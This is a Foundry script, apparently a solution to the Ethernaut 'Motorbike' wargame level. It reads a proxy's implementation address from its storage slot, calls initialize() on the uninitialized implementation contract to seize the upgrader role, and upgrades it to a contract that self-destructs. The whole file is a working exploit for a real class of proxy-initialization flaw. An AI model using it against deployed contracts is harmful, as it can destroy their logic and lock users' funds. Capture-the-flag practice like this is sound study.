// SPDX-License-Identifier: UNLICENSED
pragma solidity <0.7.0;
pragma experimental ABIEncoderV2;

import "forge-std/Script.sol";
import "forge-std/Test.sol";
import "../levels/Motorbike.sol";
import "../src/Destroy.sol";

contract MotorbikeAttack is Script {
    bytes32 impl_slot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    Engine implementation;

    function run(address motor, address dest) public {
        vm.startBroadcast();

        Motorbike proxy = Motorbike(payable(motor));
        Destroy destroy = Destroy(dest);
        implementation = Engine(address(uint256(vm.load(address(proxy), impl_slot))));
        console.log("engine addr:", address(implementation));
        implementation.initialize();
        console.log("upgrader wallet:", implementation.upgrader());
        bytes memory destroySig = abi.encodeWithSignature("destroy()");
        implementation.upgradeToAndCall(address(destroy), destroySig);
        console.log("implementation code:", isContract(address(implementation)));

        vm.stopBroadcast();
    }

    //since solidity version is <8 and there's no addr.code.length or anything yet
    function isContract(address _addr) private returns (bool isContract) {
        uint32 size;
        assembly {
            size := extcodesize(_addr)
        }
        return (size > 0);
    }
}
